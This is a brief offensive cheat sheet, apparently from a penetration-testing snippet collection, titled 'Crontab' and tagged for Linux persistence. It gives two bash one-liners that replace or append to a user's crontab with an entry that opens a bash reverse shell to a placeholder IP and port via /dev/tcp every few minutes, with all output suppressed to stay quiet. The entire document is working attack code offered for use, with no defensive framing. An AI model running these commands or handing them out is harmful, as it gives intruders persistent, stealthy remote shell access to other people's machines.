# Crontab

% crontab, schedule
#plateform/linux #target/local  #cat/PERSIST 

## replace crontab with reversr shell 
#plateform/linux #target/local  #cat/PERSIST 

```bash
(touch .tab ; echo "*/<nb_min|5> * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
```

## append reversr shell
#plateform/linux #target/local  #cat/PERSIST 

```bash
(crontab -l > .tab ; echo "*/<nb_min|5> * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
```